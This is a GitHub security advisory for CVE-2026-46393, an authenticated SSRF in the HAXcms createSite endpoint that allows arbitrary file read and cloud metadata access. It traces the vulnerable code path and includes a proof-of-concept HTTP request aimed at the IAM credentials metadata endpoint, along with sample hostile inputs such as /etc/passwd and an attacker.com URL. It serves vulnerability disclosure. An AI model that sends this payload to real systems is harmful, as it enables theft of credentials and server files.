# [H] HAXcms createSite SSRF Enables Arbitrary File Read

## Summary
Severity: High
Advisory: GHSA-q862-gcgq-5m6g
CVE: CVE-2026-46393
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-q862-gcgq-5m6g
Type: github-advisory

## Affected
- npm: `@haxtheweb/haxcms-nodejs` — affected >=0 <26.0.0

## Details
### Summary  
An authenticated Server-Side Request Forgery (SSRF) vulnerability in HAXcms allows users to fetch arbitrary internal or local resources and write the responses to a web-accessible directory, enabling arbitrary file read and internal network access.

### Details  
The `createSite` endpoint in HAXcms (v11.0.6) accepts a `build.files` parameter that allows an authenticated user to supply arbitrary URLs or local file paths. This input is processed without validation and ultimately fetched server-side using `file_get_contents()`.

The data flow is as follows:
- User input (`build.files`) is processed via `object_to_array()` into a PHP array  
- Assigned to `$filesToDownload` in `Operations.php` (line 2626)  
- Iterated over in `Operations.php` (line 2730), where each entry is passed to `HAXCMSFile::save()` with bulk-import enabled  

In `HAXCMSFile.php` (line 30), the following occurs:
```php
file_get_contents($upload['tmp_name']);
```

Here, tmp_name is attacker-controlled and may contain:

- External URLs (`http://attacker.com`)
- Internal services (`http://127.0.0.1`)
- Cloud metadata endpoints (`http://169.254.169.254`)
- Local file paths (`/etc/passwd`, `/proc/self/environ`)

The bulk-import flag bypasses `is_uploaded_file()` validation, which normally ensures the file originates from a legitimate upload. The only restriction is an extension whitelist based on the filename (array key), which is fully attacker-controlled.

There are no restrictions on:

- URL schemes (`http`, `file`, `gopher`, etc.)
- Destination IP ranges (internal, loopback, metadata services)
- Response content

All fetched content is written to:
```
sites/<sitename>/files/<filename>
```
and is accessible via the web.

### PoC
Prerequisites:

- Authenticated session (default credentials: `admin/admin` on fresh installs)
- Valid JWT and CSRF token

Step 1: Log in and capture JWT + CSRF token

Step 2: Send crafted request:
```
POST /createSite HTTP/1.1
Host: target
Authorization: Bearer [JWT]
X-CSRF-Token: [TOKEN]
Content-Type: application/json

{
  "site": {
    "name": "poc"
  },
  "build": {
    "files": {
      "poc.txt": {
        "tmp_name": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      }
    }
  }
}
```

Step 3: Retrieve response:
```
GET /sites/poc/files/poc.txt
```

The response will contain the fetched content (e.g., cloud credentials or internal service data).

### Impact

- SSRF enabling access to internal network services
- Arbitrary file read via local filesystem paths
- Cloud credential exposure through metadata endpoints
- Data exfiltration via web-accessible file storage

Any authenticated user can exploit this to access sensitive server or infrastructure data, potentially leading to full system or cloud environment compromise.

## References
- https://github.com/haxtheweb/issues/security/advisories/GHSA-q862-gcgq-5m6g
- https://nvd.nist.gov/vuln/detail/CVE-2026-46393
- https://github.com/haxtheweb/issues
